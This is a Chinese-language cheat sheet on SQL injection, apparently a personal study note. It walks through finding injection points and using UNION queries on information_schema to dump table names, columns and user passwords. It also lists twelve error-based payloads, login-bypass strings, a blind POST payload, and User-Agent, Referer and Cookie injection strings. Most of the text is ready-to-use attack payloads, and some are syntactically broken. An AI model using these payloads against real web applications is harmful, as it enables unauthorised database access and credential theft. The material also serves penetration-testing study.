# SQL注入

##  一、MySqL 

![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623828836935-8e18a301-2a6e-4457-97f1-1859cd4ddb00.png)

### 一 、同站

1. 判断是否有注入点
   * and 1=1 页面正常
   * and 1=2 页面异常
   * 如果这两个都没有异常，那就试试字符集 ?id=1'
2. 通过order by判断注入的字段数（猜一下）
   * 页面错误与正常的临界点就是字段数
   * 通过union 来测试
3. 让id=负数或者and1=2让网页报错，报错的那几个数字记住，那个数字报错就在哪里查
   * **比如2，3报错，可以 ············union  select 1，version(),database()，4**

4. 信息收集 

   * 数据库版本：version()
   * 数据库名字：database()
   * 数据库用户：user()
   * 操作系统：@@version_compile_os

5. 在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库，相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名

6. 获取相关信息

   1.  ? id=-1union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='     '
   2.  ? id=-1union select 1,group_concat(column_name),3 from information_schema.columns where table_name='     '
   3. ? id=-1union select 1,group_concat(user),group_concat(password) from   ____

   * information_schema.schemata           #information_schema下面的所有数据库名
   * information_schema.tables			#information_schema下面的所有表名
   * information_schema.columns		    #information_schema下面所有的列名
   * table_name										                             #表名
   * column_name										                         #列名
   * table_schema									                          #数据库名
   * schema_name                                                                                             #数据库列表ming名

### 二 、跨库查询

*   ? id=-1union select 1,group_concat(schema_name),3 from information_schema.schemata

### 三、文件读写函数

* load_file						文件读取
* into outfile 或into dumpfile		文件写入

**！在注入点操作**  

### 四、int 函数

判断是否为整数

``` php
	$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
	echo $sql;
	$result=mysql_query($sql);
}else{
	echo 'ni shi ge jj?';
}```
```



### 五、参数提交注入

![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png?x-oss-process=image%2Fformat%2Cwebp)

``` bash
#简要明确参数类型
数字，字符，搜索，JsoN等

#简要明确请求方法
GET, POST,COOKIE，REQUEST，HTTP头等

其中sql语句干扰符号: ',",s,),}等，具体需看写法
```

![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624337095372-9725dc09-ce09-469e-bc9e-63dffac04d31.png)

## 二、其他数据库特点

 ### 一、access注入

* Access数据库 1表名       2列名        3数据
* access 数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库
* **access三大攻击手法**
  1. access注入攻击片段-联合查询法
  2. access注入攻击片段-逐字猜解法
  3. 工具类的使用注入（推荐）
* **Access注入攻击方式**

​          union 注入、http header 注入、偏移注入等

### 二、msSQL注入

https://www.cnblogs.com/xishaonian/p/6173644.html

### 三、postgresql注入

https://www.cnblogs.com/KevinGeorge/p/8446874.html

### 四、Oracle注入

https://www.cnblogs.com/peterpan0707007/p/8242119.html

### 五、mongoDB注入

https://www.cnblogs.com/wefeng/p/11503102.html

SQLmap不能识别MongoDB这里介绍nosqlattack:https://github.com/youngyangyang04/NoSQLAttack



![img](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624416333795-8c0f82ef-e36f-4a6c-9382-b48e180b87c9.png)

## 三、 12种报错注入+万能语句

1、通过floor报错,注入语句如下:
 and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);

2、通过ExtractValue报错,注入语句如下:
 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

3、通过UpdateXml报错,注入语句如下:
 and 1=(updatexml(1,concat(0x3a,(select user())),1))

4、通过NAME_CONST报错,注入语句如下:
 and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)

5、通过join报错,注入语句如下:
 select * from(select * from mysql.user ajoin mysql.user b)c;

6、通过exp报错,注入语句如下:
 and exp(~(select * from (select user () ) a) );

7、通过GeometryCollection()报错,注入语句如下:
 and GeometryCollection(()select *from(select user () )a)b );

8、通过polygon ()报错,注入语句如下:
 and polygon (()select * from(select user ())a)b );

9、通过multipoint ()报错,注入语句如下:
 and multipoint (()select * from(select user() )a)b );

10、通过multlinestring ()报错,注入语句如下:
 and multlinestring (()select * from(selectuser () )a)b );

11、通过multpolygon ()报错,注入语句如下:
 and multpolygon (()select * from(selectuser () )a)b );

12、通过linestring ()报错,注入语句如下:
 and linestring (()select * from(select user() )a)b );

# 关于POST注入

> 常用的万能username语句：
>  a ’ or 1=1 #
>  a ") or 1=1 #
>  a‘) or 1=1 #
>  a” or “1”=”1
>  ' or '1'='1
>  ' or (length(database())) = 8  (用于输入’ “都没有错误)
>  ' or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)
>  ") or ("1")=("1
>  ") or 1=1 or if(1=1, sleep(1), null)  #
>  ") or (length(database())) = 8 #
>  ") or (ascii(substr((select database()) ,1,1))) = 115  or if(1=1, sleep(1), null)  #

# post型盲注通杀payload：

> uname=admin%df'or()or%200%23&passwd=&submit=Submit.
>
> 万能密码 �'or1=1#

# 关于UPDATEXML,REFERER,COOKIE的构造

> User-Agent:.........`' or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #`
>  Referer: `’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #`
>  Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #

#### updatexml报错注入

> 爆数据库版本信息：`?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)`
>  链接用户：`?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)`
>  链接数据库：`?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)`
>  爆库：`?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)`
>  爆表：`?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)`
>  爆字段：`?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)`
>  爆字段内容：`?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)`

